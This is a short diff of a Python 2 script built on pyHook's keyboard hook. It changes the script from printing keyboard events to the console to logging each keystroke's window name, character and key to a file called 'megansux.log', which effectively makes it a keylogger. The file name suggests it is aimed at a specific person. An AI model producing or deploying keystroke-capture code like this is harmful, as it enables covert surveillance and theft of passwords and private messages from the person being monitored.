@@ -6,23 +6,14 @@ try:
 except:
 	print "Either pyHook or pythoncom modules are missing!"
 
-#logfile = "logs.txt"
+logging.basicConfig(filename="megansux.log", level=logging.INFO, format='%(asctime)s %(message)s')
 
 def OnKeyboardEvent(event):
-    print 'MessageName:',event.MessageName
-    print 'Message:',event.Message
-    print 'Time:',event.Time
-    print 'Window:',event.Window
-    print 'WindowName:',event.WindowName
-    print 'Ascii:', event.Ascii, chr(event.Ascii)
-    print 'Key:', event.Key
-    print 'KeyID:', event.KeyID
-    print 'ScanCode:', event.ScanCode
-    print 'Extended:', event.Extended
-    print 'Injected:', event.Injected
-    print 'Alt', event.Alt
-    print 'Transition', event.Transition
-    print '---'
+#    logging.info('MessageName: %s',event.MessageName)
+#    logging.info('Time: %s',event.Time)
+    logging.info('WindowName: %s',event.WindowName)
+    logging.info('Ascii: %s %s', event.Ascii, chr(event.Ascii))
+    logging.info('Key: %s', event.Key)
 
 # return True to pass the event to other handlers
     return True
